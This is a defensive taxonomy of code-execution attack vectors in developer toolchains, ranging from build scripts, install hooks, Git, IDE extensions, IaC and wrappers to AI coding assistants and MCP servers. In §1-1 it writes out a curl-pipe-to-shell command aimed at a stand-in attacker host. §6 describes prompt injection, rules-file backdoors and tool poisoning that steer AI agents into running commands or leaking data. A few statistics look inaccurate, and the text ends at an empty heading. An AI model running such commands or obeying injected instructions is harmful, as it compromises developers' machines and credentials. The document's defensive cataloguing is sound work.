# Developer Toolchain & Build System RCE Mutation Taxonomy

**A Comprehensive Classification of Code Execution Attack Vectors Across Developer Tools, Build Systems, Compilers, IDE Extensions, and AI Coding Assistants**

---

## Scope & Positioning

This document covers **code execution vulnerabilities inherent in developer tools themselves** — the build systems, compilers, linters, IDE extensions, and AI assistants that developers invoke daily. The attack surface analyzed here is the **toolchain layer**: what happens when a developer clones a repository, installs dependencies, opens a project in an IDE, runs a build, or asks an AI assistant for code.

**Boundary with CI/CD Pipeline Security (§ separate document):** The CI/CD taxonomy covers orchestration-layer attacks — workflow YAML injection, Poisoned Pipeline Execution (PPE), runner compromise, expression language injection in GitHub Actions/Jenkins/GitLab CI. This document covers the **tools invoked by** those pipelines (or run locally), not the pipeline orchestration itself.

**Boundary with Dependency Confusion (§ separate document):** The dependency confusion taxonomy covers registry resolution order, namespace squatting, and package name collision. This document covers what happens **after** a package is resolved — specifically, the code execution mechanisms within build tools and package managers that make dependency-based attacks impactful.

---

## Classification Structure

This taxonomy organizes developer toolchain RCE vulnerabilities across **three orthogonal axes**:

**Axis 1 (Primary): Toolchain Component** — The structural layer of the developer toolchain being exploited for code execution. This forms the main organizational structure (§1–§9).

**Axis 2 (Cross-Cutting): Execution Trigger Mechanism** — How the attacker causes code to execute on the developer's machine. These mechanisms appear across multiple components.

**Axis 3 (Mapping): Development Workflow Phase** — When in the development lifecycle the code execution occurs, determining which machines and environments are at risk.

### Cross-Cutting Execution Trigger Mechanisms (Axis 2)

| Mechanism | Description | Key Characteristic |
|-----------|-------------|-------------------|
| **Implicit Config Execution** | Build/tool configuration files that execute arbitrary code by design | `webpack.config.js`, `build.gradle`, `setup.py` are code, not data |
| **Lifecycle Hook Abuse** | Package managers execute scripts at install/build/test phases | `preinstall`, `postinstall`, `setup.py`, `build.rs` |
| **Compiler/Linker Injection** | Malicious code injected through compiler flags, linker directives, or AST manipulation | cgo LDFLAGS, Babel `path.evaluate()`, proc macros |
| **VCS-Triggered Execution** | Repository clone/checkout operations trigger code execution | Git hooks via symlinks, gitattributes filters, submodule exploitation |
| **Extension/Plugin Poisoning** | Malicious or compromised extensions execute in the IDE context | VSCode Marketplace, JetBrains plugins, browser DevTools extensions |
| **Prompt Injection → Code Execution** | AI coding assistants tricked into executing commands via crafted input | Rules file backdoor, indirect prompt injection in issues/PRs |
| **Tool Vulnerability Exploitation** | Bugs in the developer tool itself enable code execution | Path traversal in dev servers, deserialization in build plugins |
| **Build System Bootstrap Compromise** | Wrapper scripts or bootstrap binaries tampered before the real build tool runs | Gradle Wrapper, Maven Wrapper, XZ Utils build process |

### Development Workflow Phase Mapping (Axis 3)

| Phase | When | Tools at Risk | Typical Target |
|-------|------|---------------|----------------|
| **Clone/Checkout** | `git clone`, `git checkout` | Git, VCS clients | Developer workstation |
| **Install/Resolve** | `npm install`, `pip install`, `cargo build` | Package managers | Workstation + CI |
| **Build/Compile** | `make`, `gradle build`, `webpack`, `tsc` | Build tools, compilers, bundlers | Workstation + CI |
| **Edit/Develop** | Opening project in IDE | IDE, extensions, AI assistants | Developer workstation |
| **Test/Lint/Format** | `pytest`, `eslint`, `prettier` | Test runners, linters, formatters | Workstation + CI |
| **Provision/Deploy** | `terraform apply`, `docker build` | IaC tools, container builders | Workstation + CI + Infra |

---

## §1. Build Configuration File Execution

Modern build tools use **configuration files that are executable code**, not declarative data. Opening or building a project inherently means running the author's code. This is the most fundamental and pervasive attack surface in developer toolchains.

### §1-1. JavaScript/TypeScript Build Configuration

JavaScript bundlers and build tools use `.js` or `.ts` configuration files that execute in a full Node.js context with filesystem, network, and process access.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Webpack Config Execution** | `webpack.config.js` runs as a Node.js module during `webpack` invocation. Can execute arbitrary code, spawn processes, make network requests. | Developer runs `webpack` or `npm run build` on an untrusted project |
| **Vite Config Execution** | `vite.config.ts` / `vite.config.js` executes during `vite dev` or `vite build`. Supports plugin hooks with full Node.js capabilities. | Project uses Vite; developer runs any Vite command |
| **Rollup Config Execution** | `rollup.config.js` executes plugins and configuration code during bundling. | Developer runs `rollup -c` |
| **ESBuild Plugin Execution** | esbuild plugins defined in build scripts execute arbitrary code during builds. | Custom build scripts using esbuild API |
| **Next.js/Nuxt Config Execution** | `next.config.js` / `nuxt.config.ts` execute during framework commands. Can modify webpack configuration, add custom plugins, and run arbitrary code at server start. | Developer runs `next dev`, `next build`, `nuxt dev` |

**The fundamental issue**: JS ecosystem build tools cannot distinguish between "configuration" and "arbitrary program." A `webpack.config.js` with `require('child_process').execSync('curl attacker.com/shell.sh | sh')` is syntactically valid configuration.

### §1-2. JVM Build Script Execution (Gradle/Maven)

Gradle uses Groovy/Kotlin build scripts that are full programs, while Maven POM files can invoke plugins with arbitrary code execution capabilities.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Gradle Build Script Injection** | `build.gradle` / `build.gradle.kts` files are Groovy/Kotlin programs with full JVM access. Any code in `buildscript {}`, `plugins {}`, or task definitions executes during build. | Developer runs any `gradle` command, including `gradle tasks` |
| **Gradle Init Script Injection** | `init.gradle` files in `~/.gradle/init.d/` execute before any build, providing system-wide code execution. A malicious project can instruct users to install init scripts. | Init scripts placed in user's Gradle home directory |
| **Maven Plugin Code Execution** | Maven plugins execute arbitrary JVM code during build lifecycle phases. Malicious plugins can steal credentials, mine cryptocurrency, or install backdoors. A trojanized `wagon-ssh` plugin was found in Maven Central (2022). | Project declares malicious plugin in `pom.xml`; developer runs `mvn install` |
| **Gradle Plugin Resolution Exploitation** | Gradle plugins resolved from plugin repositories execute arbitrary code. Attackers publish malicious plugins or exploit deserialization flaws in legitimate ones (e.g., Maven Extension plugin deserialization CVE). | Project applies untrusted Gradle plugin |
| **settings.gradle Execution** | `settings.gradle` executes before `build.gradle`, enabling code execution even when a developer is just inspecting a project with `gradle projects`. | Any Gradle command triggers settings evaluation |

### §1-3. Native Build System Execution (Make/CMake)

Traditional build systems execute shell commands by design during the build process.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Makefile Shell Execution** | Makefiles invoke shell commands for every target. A malicious Makefile can execute arbitrary commands when the developer runs `make`. | Developer runs `make` on an untrusted project |
| **CMakeLists.txt Execution** | CMake's `execute_process()`, `add_custom_command()`, and `ExternalProject_Add()` can run arbitrary commands during configuration and build phases. | Developer runs `cmake ..` or builds a CMake project |
| **Autotools/configure Script Execution** | `./configure` scripts (generated by autotools) are shell scripts that execute during build configuration. The XZ Utils backdoor (CVE-2024-3094) exploited `build-to-host.m4` to inject malicious code into the Makefile. | Developer runs `./configure && make` |
| **Meson Build Execution** | `meson.build` files can execute subprocesses and run generators during configuration. | Developer runs `meson setup builddir` |

The XZ Utils case (CVE-2024-3094, CVSS 10.0) is the landmark example: a three-year social engineering campaign culminated in a backdoor injected via the build system's `m4` macros, affecting the autotools-generated Makefile to extract and execute malicious code from disguised test files.

### §1-4. Rust Build Script Execution

Rust's Cargo executes `build.rs` files and procedural macros at compile time with full system access.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **build.rs Arbitrary Execution** | Cargo compiles and runs `build.rs` before building the crate. This script has full filesystem, network, and process access — it can download files, execute binaries, or modify the build output. | `cargo build` on any crate with a `build.rs` file |
| **Procedural Macro Execution** | Proc macros (`#[derive(...)]`, `#[proc_macro]`) execute arbitrary Rust code at compile time. A malicious proc macro crate can run any code when the compiler processes the macro. | Project depends on a crate with proc macros |
| **Cargo Timing Report Injection** | Malicious dependencies can inject arbitrary JavaScript into cargo-generated timing reports (GHSA-wrrj-h57r-vx9p), leading to XSS if the report is opened in a browser. | Developer generates and views cargo timing report |

The Rust community has discussed sandboxing `build.rs` and proc macros for years, but no implementation exists. Currently, `cargo build` on any crate with these features means running arbitrary code.

### §1-5. Python Build Backend Execution

Python package installation and building execute arbitrary code through multiple mechanisms.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **setup.py Arbitrary Execution** | `pip install` from a source distribution (sdist) executes `setup.py` with full Python capabilities. This is the single most abused vector for malicious Python packages. | `pip install` from sdist; package not available as wheel |
| **pyproject.toml Build Backend** | PEP 517/518 build backends specified in `pyproject.toml` are invoked during builds. A malicious build backend can execute arbitrary code. | Package specifies custom build backend; developer runs `pip install` |
| **conftest.py Auto-Loading** | pytest auto-discovers and loads `conftest.py` files from the project root. These execute arbitrary Python code when tests are run. | Developer runs `pytest` on an untrusted project |
| **setup.cfg/setup.py Metadata Injection** | Package metadata fields (entry_points, console_scripts) can be abused to install executables that shadow legitimate system tools. | Package installed globally or in active virtualenv |

---

## §2. Package Manager Lifecycle Hook Exploitation

Package managers in every major ecosystem provide "lifecycle hooks" — scripts that execute automatically during installation, update, or removal. These hooks transform `install` commands into arbitrary code execution primitives.

### §2-1. npm/Node.js Install Scripts

npm's lifecycle scripts are the most extensively weaponized package manager hooks, with `preinstall` and `postinstall` accounting for the majority of malicious npm packages.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **preinstall Execution** | Code in `package.json` `scripts.preinstall` runs before the package is installed. Even if installation fails, the preinstall script has already executed. | `npm install` with default settings; `--ignore-scripts` not set |
| **postinstall Execution** | `scripts.postinstall` runs after installation. Used legitimately for native compilation but abused for data exfiltration, reverse shells, and credential theft. | Default npm configuration |
| **install Script Execution** | `scripts.install` runs during the installation process between `preinstall` and `postinstall`. | Default npm configuration |
| **prepare Script Execution** | `scripts.prepare` runs on `npm install` (without arguments) and before `npm publish`. Can execute arbitrary code in development contexts. | Developer runs `npm install` in a cloned repo |

The Shai-Hulud campaign (September–November 2025) demonstrated self-propagating exploitation of npm lifecycle scripts: malicious `postinstall` hooks harvested npm tokens, GitHub PATs, and cloud credentials from 25,000+ repositories, then used stolen tokens to automatically inject the same hooks into other packages maintained by compromised developers.

### §2-2. pip/Python Installation Hooks

Python's package installation can execute arbitrary code through multiple pathways during the install process.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **setup.py install-time execution** | `python setup.py install` (or `pip install` from sdist) runs the entire `setup.py` as a Python script. Malicious packages use this to exfiltrate data via DNS callbacks or HTTP requests. | Package only available as sdist; `pip install` without `--no-build-isolation` override |
| **Native Extension Build Hooks** | Packages with C/C++ extensions run build scripts during installation that can include arbitrary commands disguised as compilation steps. | Package has native extensions; developer installs from source |
| **egg-info/dist-info Script Installation** | Packages can install console scripts and entry points that replace or shadow legitimate system commands on PATH. | Package installed with `pip install` |

### §2-3. Cargo/Rust Build-Time Execution

(Cross-reference with §1-4.) Cargo's `build.rs` functions as both a build configuration file and an installation hook. When `cargo build` or `cargo install` resolves dependencies, each dependency's `build.rs` executes on the developer's machine.

### §2-4. RubyGems Extension Execution

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Native Extension Build** | Gems with native extensions execute `extconf.rb` or `Rakefile` during `gem install`, running arbitrary Ruby code that compiles (and can execute) C/C++ code. | Gem has native extensions; developer runs `gem install` |
| **Gemspec eval Injection** | Crafted gem names with special characters can inject code into gemspec stubs, which are `eval`-ed during the preinstall check. | Malicious gemspec processed by RubyGems |
| **Gemfile Code Execution** | `Gemfile` is a Ruby file that's `eval`-ed by Bundler. A malicious Gemfile in a cloned repository can execute arbitrary code when the developer runs `bundle install`. | Developer runs `bundle install` on an untrusted project |

### §2-5. Go Module Build-Time Execution

Go's toolchain executes code at several points during module operations. The same feature (cgo) has been affected by **seven** distinct code execution CVEs.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **cgo Directive Injection** | `#cgo CFLAGS`, `#cgo LDFLAGS`, and `#cgo pkg-config` directives in Go source files are passed to the C compiler/linker. Attackers can smuggle malicious flags through sanitization bypasses. (CVE-2023-29404, CVE-2023-29405, CVE-2024-24787) | Building Go code with cgo enabled (default on most platforms) |
| **go generate Execution** | `//go:generate` directives execute arbitrary commands when `go generate` is run. A malicious repository can include dangerous generate directives. | Developer runs `go generate ./...` on an untrusted project |
| **go.mod Toolchain Directive** | The `toolchain` directive in `go.mod` (introduced in Go 1.21) could be leveraged to execute scripts relative to the module root. (CVE-2023-39320) | Developer builds or tests a module with a crafted `go.mod` |
| **VCS Command Injection** | Various Go toolchain operations in untrusted VCS repositories can result in unexpected code execution through how external VCS commands are constructed. (CVE-2025-68119, CVE-2025-4674) | `go get` or `go mod download` from untrusted sources |

---

## §3. Compiler & Transpiler Exploitation

Compilers and transpilers execute code or process data in ways that can be exploited for arbitrary code execution during the compilation phase — before the resulting program ever runs.

### §3-1. Transpiler AST Evaluation Vulnerabilities

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Babel path.evaluate() RCE** | Babel's `@babel/traverse` evaluates expressions during AST traversal. Specifically crafted code can trigger arbitrary code execution at compile time via `path.evaluate()` or `path.evaluateTruthy()`. (CVE-2023-45133) | Using Babel to compile untrusted code with plugins that use `path.evaluate()` |
| **TypeScript Compiler Plugin Execution** | TypeScript's `ts.Program` can load compiler plugins/transformers that execute arbitrary code during compilation. Custom transformers have full Node.js access. | Project uses custom TypeScript transformers |
| **SWC/esbuild Plugin Execution** | Modern transpiler plugins execute arbitrary code during the compilation pipeline. | Project uses SWC or esbuild with custom plugins |

### §3-2. Native Compiler Toolchain Exploitation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **cgo Build-Time RCE (Go)** | Go's cgo integration passes compiler/linker flags from source code directives. Multiple bypass vectors allow injecting flags that cause the C compiler to execute attacker-controlled code. Seven CVEs in the same feature (2018–2024). | `go build` on modules with cgo; Darwin-specific CVE-2024-24787 |
| **Compiler Trojanization** | The "Trusting Trust" attack: a compromised compiler injects backdoors into all code it compiles, including future versions of itself. | Using a compiler from an untrusted source; supply chain compromise of compiler distribution |
| **Linker Script Injection** | Crafted linker scripts or object files can cause the linker to execute code or include malicious sections during the linking phase. | Building code that links against untrusted libraries |

### §3-3. Code Generator Exploitation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Protocol Buffer / gRPC Code Generation** | Protobuf compiler plugins (`protoc-gen-*`) execute as external processes during code generation. A malicious plugin can execute arbitrary code. | Project uses protobuf with custom plugins |
| **OpenAPI/Swagger Code Generation** | Code generators (openapi-generator, swagger-codegen) execute templates that can include arbitrary code. | Developer generates code from untrusted API specifications |
| **GraphQL Code Generation** | GraphQL codegen tools execute plugin code and can process malicious schema definitions. | Using code generation with untrusted GraphQL schemas |

---

## §4. Version Control System Hooks & Exploits

Git and other VCS tools can execute code during clone, checkout, commit, and merge operations through hooks, filters, and submodule processing.

### §4-1. Git Clone/Checkout Code Execution

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Submodule Symlink Hook Injection (CVE-2024-32002)** | On case-insensitive filesystems, a repository with crafted submodules can exploit symlinks to write into the `.git/hooks/` directory during clone, executing a hook before the clone completes. CVSS 9.0. | Git clone on case-insensitive filesystem (Windows/macOS); `core.symlinks` not disabled |
| **Multi-User Clone RCE (CVE-2024-32004)** | On multi-user machines, an attacker can prepare a local repository that looks like a partial clone. When cloned by another user, Git executes arbitrary code with the cloning user's permissions. | Multi-user system; git clone of local repository |
| **Gitattributes Filter Execution** | `.gitattributes` can define `clean` and `smudge` filters — shell commands that execute during checkout and staging. A malicious repository can define filters that run arbitrary code. | Developer checks out files from a repository with custom gitattributes; filters explicitly enabled |
| **Git Config Quoting Bypass (GHSA-vwqx-4fm8-6qc9)** | Broken config quoting in Git allows arbitrary code execution through carefully crafted configuration values. | Git processes configuration with special characters |

### §4-2. Git Hook Exploitation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Pre-commit Hook Persistence** | An attacker who gains write access to a repository's `.git/hooks/` directory can install hooks that execute on every commit, merge, or push operation by any developer. | Shared repository on multi-user system; compromised developer environment |
| **Server-Side Hook RCE** | Server-side Git hooks (pre-receive, post-receive, update) execute on the Git server. Exploitation enables server-side RCE affecting all users of the repository. (CVE-2020-14144, Gitea hooks RCE) | Self-hosted Git server with writable hook configuration |
| **Hook Installation via Social Engineering** | Attacker convinces developer to install git hooks (e.g., "run this setup script for the project") that persist and execute on future operations. | Developer follows setup instructions from untrusted repository |

### §4-3. Repository Content Triggering Tool Execution

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **EditorConfig / Tool Config Auto-Loading** | IDEs and tools automatically load configuration files (`.editorconfig`, `.eslintrc.js`, `.prettierrc.js`) from the repository root. JavaScript-based configs execute code. | Developer opens project in IDE that auto-loads config files |
| **Pre-commit Framework Hook Execution** | The `pre-commit` framework installs hooks from remote repositories. A malicious hook repository can execute arbitrary code during git operations. | Developer uses `pre-commit install` with untrusted hook sources |
| **Git LFS Smudge Filter Exploitation** | Git LFS uses smudge filters to fetch large files during checkout. Malicious configuration can redirect LFS fetches to attacker-controlled servers or execute custom code. | Repository uses Git LFS with custom transfer agents |

---

## §5. IDE & Editor Extension Exploitation

IDEs execute third-party extension code with the same permissions as the IDE itself — typically full access to the filesystem, network, and all open projects. The extension marketplace model creates a massive attack surface.

### §5-1. VSCode Extension Attacks

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Malicious Extension Publication** | Attacker publishes an intentionally malicious extension on the VSCode Marketplace. The GlassWorm attack (October 2025) used invisible Unicode to steal credentials and install a RAT. | Developer installs an unvetted extension |
| **Extension Impersonation** | Attacker publishes an extension mimicking a popular one (e.g., "prettier-vscode-plus" impersonating Prettier, November 2025). Multi-stage payload delivers the Anivia loader and OctoRAT. | Developer installs look-alike extension by mistake |
| **Compromised Extension Update** | Attacker compromises the maintainer account (via phishing, leaked PAT) and pushes a malicious update. The TigerJack campaign (September 2025) affected extensions with 17,000+ downloads. | Auto-update installs malicious version transparently |
| **Leaked Publisher Access Token** | Over 100 VSCode extensions were found to leak their Marketplace access tokens, allowing attackers to push malicious updates directly. | Attacker discovers leaked PAT in extension source or logs |
| **Extension Configuration File RCE** | CVE-2025-65715 (Code Runner): modifying the extension's configuration file to specify malicious executors causes the extension to execute arbitrary commands. | Attacker modifies workspace settings or tricks user into loading crafted settings |
| **Open VSX Namespace Squatting** | VS Code forks (Cursor, Windsurf, Trae) recommend extensions that don't exist in the Open VSX registry. Attackers claim these namespaces and upload malicious extensions. A placeholder PostgreSQL extension attracted 500+ installs purely from IDE recommendations. | Developer uses a VS Code fork that recommends missing extensions |

### §5-2. JetBrains IDE Attacks

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **GitHub Plugin Token Exposure (CVE-2024-37051)** | Malicious content in a pull request caused IntelliJ IDEs to leak GitHub access tokens to third-party hosts. CVSS 9.3. | IntelliJ IDE 2023.1+ with GitHub plugin enabled; developer views malicious PR |
| **Malicious Plugin Repository in Project Config** | IntelliJ IDEA allowed code execution via a malicious plugin repository URL specified in the project configuration, even in "Untrusted Project" mode. | Developer opens untrusted project in IntelliJ |
| **Plugin Marketplace Poisoning** | JetBrains Marketplace plugins execute with full IDE permissions. A compromised or malicious plugin has access to all project files, credentials, and developer environment. | Developer installs unvetted JetBrains plugin |

### §5-3. Browser DevTools Extension Attacks

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Chrome Extension Supply Chain Compromise** | December 2024: phishing campaign compromised developer accounts, pushing malicious updates to 16+ Chrome extensions affecting 3.2M+ users (TamperedChef). | Auto-update delivers malicious extension version |
| **DevTools Extension Credential Theft** | Trust Wallet Chrome extension compromised via leaked API key (December 2025), resulting in $7–8.5M cryptocurrency theft from 2,520 wallets. | Developer uses compromised browser extension |
| **OAuth Application Phishing for Extension Access** | Attackers phish extension developers with fake OAuth applications to gain Chrome Web Store publishing access, then push malicious updates. | Extension developer falls for OAuth phishing |

---

## §6. AI Coding Assistant & MCP Server Exploitation

AI coding assistants (GitHub Copilot, Cursor, Windsurf, Codex CLI) and MCP (Model Context Protocol) servers represent an **emerging and rapidly expanding** attack surface. These tools have **autonomous code execution capabilities** on developer machines, and prompt injection converts untrusted data into commands.

### §6-1. Prompt Injection → Code Execution

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Indirect Prompt Injection via Repository Content** | Malicious instructions embedded in source files, comments, issue descriptions, or PR bodies are processed by the AI assistant, which then executes commands on the developer's machine. Attack success rates: 41–84%. | AI coding assistant processes untrusted repository content |
| **Rules File Backdoor** | AI coding assistants use "rules files" (`.cursorrules`, `.github/copilot-instructions.md`) to guide behavior. Attackers inject invisible Unicode-obfuscated instructions that direct the AI to insert vulnerabilities, exfiltrate data, or execute commands. | Developer opens project with poisoned rules file; AI assistant follows hidden instructions |
| **Configuration File Manipulation (IDEsaster)** | 30+ CVEs across Cursor, GitHub Copilot, Windsurf, Zed, and Roo Code: prompt injection causes AI agents to edit workspace configuration files (`.vscode/settings.json`, multi-root workspace settings) to achieve code execution. CVE-2025-64660, CVE-2025-61590, CVE-2025-58372. | AI assistant processes input containing crafted prompts |
| **Terminal Command Injection** | AI assistants with terminal access can be tricked into executing malicious shell commands. Attackers craft prompts that cause the assistant to run `curl | sh`, install malicious packages, or exfiltrate environment variables. | AI assistant has terminal/shell execution capability |

### §6-2. MCP Server Vulnerabilities

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **MCP Server Command Injection** | 43% of analyzed MCP server implementations contain command injection flaws. Attackers can inject OS commands through tool parameters that are passed to shell execution. (CVE-2026-0755, CVSS 9.8) | Developer uses MCP server that passes inputs to shell |
| **MCP Inspector DNS Rebinding RCE** | CVE-2025-49596 (CVSS 9.4): Anthropic's MCP Inspector was vulnerable to DNS rebinding, allowing browser-based attacks to execute code on the developer's machine. | Developer runs MCP Inspector with default network binding |
| **NeighborJack (0.0.0.0 Binding)** | Hundreds of MCP servers bind to `0.0.0.0` by default, exposing command injection and SSRF surfaces to the local network and internet. 437,000+ developer environments compromised via CVE-2025-6514. | MCP server running with default configuration without firewall |
| **MCP Tool Poisoning** | Malicious MCP tool descriptions embed hidden instructions that override the AI assistant's behavior, causing it to execute attacker-controlled actions when the tool is invoked. | Developer adds untrusted MCP server to their environment |

### §6-3. AI Codex CLI & Agent Exploitation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **OpenAI Codex CLI Configuration RCE (CVE-2025-61260)** | Codex CLI implicitly trusts commands configured via MCP server entries in repository configuration files. A malicious repo can execute arbitrary commands when Codex CLI starts up. | Developer runs Codex CLI in a repository with malicious config |
| **Agentic Loop Exploitation** | AI agents in autonomous mode can be manipulated to install malicious packages, modify system files, or exfiltrate data through a sequence of seemingly benign operations. | AI agent operates in autonomous/auto-approve mode on untrusted codebase |
| **Training Data Poisoning for Tool Recommendations** | AI assistants recommend tools, packages, or configurations based on training data. Poisoned training data can cause consistent recommendations of malicious or non-existent packages (slopsquatting). | Developer installs AI-recommended packages without verification |

---

## §7. Linter, Formatter & Test Framework Plugin Exploitation

Code quality tools execute plugins, configurations, and test code during analysis — creating code execution surfaces that are often overlooked because they're perceived as "read-only" or "safe."

### §7-1. Linter Plugin Execution

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **ESLint JavaScript Config Execution** | `.eslintrc.js` and `eslint.config.js` are Node.js modules that execute arbitrary code when ESLint runs. Custom rules and plugins execute in the linter's process. | Developer runs `eslint` or IDE auto-runs it on file save |
| **ESLint Supply Chain Compromise (CVE-2025-54313)** | The eslint-config-prettier package (31M weekly downloads) was compromised via maintainer phishing. Malicious versions loaded `node-gyp.dll` on Windows. | Developer has compromised version in `node_modules` |
| **Pylint/Flake8 Plugin Execution** | Python linter plugins execute arbitrary Python code during analysis. | Developer runs linter with untrusted plugins |
| **Custom Rule Execution** | Many linters support custom rules that execute during analysis. Rules can access the filesystem, network, and process environment. | Project includes custom linter rules that the developer loads |

### §7-2. Formatter Plugin Exploitation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Prettier Plugin Execution** | Prettier plugins are Node.js modules that execute during formatting. The `eslint-plugin-prettier` supply chain compromise (July 2025) demonstrated this attack vector at scale. | Developer uses Prettier with third-party plugins |
| **Black/autopep8 Import-Time Execution** | Python formatters import project code during formatting, potentially executing malicious `__init__.py` or configuration files. | Developer formats code in a project with malicious Python files |

### §7-3. Test Framework Exploitation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **pytest conftest.py Auto-Loading** | pytest discovers and executes `conftest.py` files automatically from the project root and all subdirectories. These files run arbitrary Python code before any test. | Developer runs `pytest` on an untrusted project |
| **Jest Config Execution** | `jest.config.js` / `jest.config.ts` execute as Node.js modules. Transform configurations, module name mappers, and setup files all execute arbitrary code. | Developer runs `jest` or `npm test` |
| **Test File as Payload Delivery** | Test files themselves are code. A malicious test file in a contributed PR executes when the developer runs the test suite locally. "Test Harness Injection" — see §1-2 of CI/CD taxonomy for the pipeline context. | Developer runs tests on code from untrusted contributors |
| **pytest Plugin Execution** | pytest auto-discovers and loads plugins from the project's `pyproject.toml` or `setup.cfg`. A malicious plugin executes arbitrary code. | Developer runs pytest with project-specified plugins |

---

## §8. Infrastructure-as-Code & Container Build Tool Exploitation

IaC tools and container builders execute code as a core part of their operation — providers, provisioners, and Dockerfile `RUN` instructions are all code execution surfaces.

### §8-1. Terraform/OpenTofu Exploitation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Malicious Provider Plugin** | Terraform providers are Go binaries that execute with full system access. A malicious provider plugin can steal credentials, install backdoors, or modify infrastructure. | Developer runs `terraform init` with untrusted provider configuration |
| **External Data Source RCE** | Terraform's `external` data source executes arbitrary programs to fetch data. A malicious configuration can execute any command on the developer's machine. | `terraform plan` or `terraform apply` with `external` data source |
| **go-getter Library RCE (CVE-2024-6257)** | HashiCorp's go-getter library (used by Terraform) can be coerced into executing Git commands on maliciously modified Git configurations, leading to arbitrary code execution. | `terraform init` fetches modules from untrusted sources |
| **Arbitrary File Write during Init** | Terraform 1.0.8–1.5.6 allowed arbitrary file write during `terraform init` when processing malicious configuration. | Developer runs `terraform init` on untrusted configuration |
| **Checkov Deserialization RCE (CVE-2025-2180)** | Unsafe deserialization in Palo Alto's Checkov (Terraform security scanner) allows RCE when scanning malicious Terraform files. The security tool itself becomes the attack vector. | Developer scans untrusted Terraform files with Checkov |

### §8-2. Pulumi Exploitation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **General-Purpose Language Execution** | Pulumi programs are written in Python, TypeScript, Go, or C# and execute with full language capabilities. Unlike HCL, Pulumi's IaC code can make arbitrary network calls, spawn processes, and access the filesystem. | Developer runs `pulumi up` on untrusted Pulumi program |
| **Plugin Execution** | Pulumi plugins (providers, policy packs) are executables that run on the developer's machine with the user's full permissions. | Untrusted Pulumi plugin installed |

### §8-3. Container Build Exploitation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Dockerfile RUN Instruction** | `RUN` instructions in Dockerfiles execute arbitrary commands during `docker build`. A malicious Dockerfile can download and execute payloads, exfiltrate data, or install backdoors in the resulting image. | Developer runs `docker build` on untrusted Dockerfile |
| **Build Context Symlink Traversal** | When the Docker build context contains symlinks pointing outside the intended directory, `COPY` follows them, potentially exposing sensitive host files to the build process. | `docker build` with untrusted build context containing symlinks |
| **Multi-Stage Build Secret Leakage** | Secrets passed to build stages via `--build-arg` or `--secret` can be inadvertently cached in intermediate layers. | Multi-stage build without proper secret management |
| **Buildpack Code Execution** | Cloud Native Buildpacks automatically detect and build applications, executing detection scripts and build scripts that can contain malicious code. | Using buildpacks on untrusted source code |

---

## §9. Build System Bootstrap & Wrapper Attacks

Before the actual build tool runs, many projects use wrapper scripts or bootstrap mechanisms to download and configure the build tool itself. These bootstrapping stages execute with implicit trust and minimal verification.

### §9-1. Build Tool Wrapper Attacks

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Gradle Wrapper Tampering** | The `gradlew` / `gradlew.bat` wrapper script and `gradle-wrapper.jar` can be replaced with malicious versions that execute arbitrary code before delegating to Gradle. Malicious Gradle wrappers have been found that modify `build.gradle` to add dependencies, relocate injected code, and execute payloads. | Developer runs `./gradlew` without verifying wrapper integrity |
| **Maven Wrapper Tampering** | Similar to Gradle Wrapper, `mvnw` can be replaced with a malicious script that executes before Maven. | Developer runs `./mvnw` on an untrusted project |
| **Node Version Manager (nvm/fnm) Exploitation** | `.nvmrc` or `.node-version` files specify the Node.js version. While not directly code execution, combined with compromised Node.js distributions, this can be an attack vector. | Developer uses nvm that auto-switches versions based on project config |

### §9-2. Build Tool Distribution Compromise

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Trojanized Build Tool Distribution** | The XZ Utils backdoor (CVE-2024-3094) exemplifies this: the attacker compromised the build process of a widely-used compression library, injecting a backdoor that only manifested in distribution tarballs (not in the Git source). | Developer/distro builds from compromised tarball rather than from verified Git source |
| **Build Tool Update Hijacking** | Compromise of the build tool's update mechanism (registry, CDN, DNS) to serve a malicious version. | Auto-update fetches from compromised source |
| **S1ngularity/Nx Build System Compromise (August 2025)** | The Nx monorepo build system was compromised, injecting AI-powered malware into widely-used packages through the build system itself. | Developer uses compromised version of Nx build system |

### §9-3. Environment Variable & PATH Manipulation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **PATH Hijacking via .envrc/.env** | Tools like `direnv` auto-load `.envrc` files, which can modify PATH to prepend directories containing trojanized binaries that shadow legitimate tools. | Developer uses direnv and enters directory with malicious `.envrc` |
| **Arbitrary Code via Environment Variables (CVE in Gradle)** | Gradle was vulnerable to arbitrary code execution via specially crafted environment variables (GHSA-6j2p-252f-7mw8). | Attacker controls environment variables in developer's shell |
| **LD_PRELOAD / DYLD_INSERT_LIBRARIES** | A malicious `.envrc` or project setup script can set LD_PRELOAD to load a shared library that hooks system calls in all subsequent processes. | Developer runs setup script from untrusted project |

---

## Attack Scenario Mapping (Axis 3)

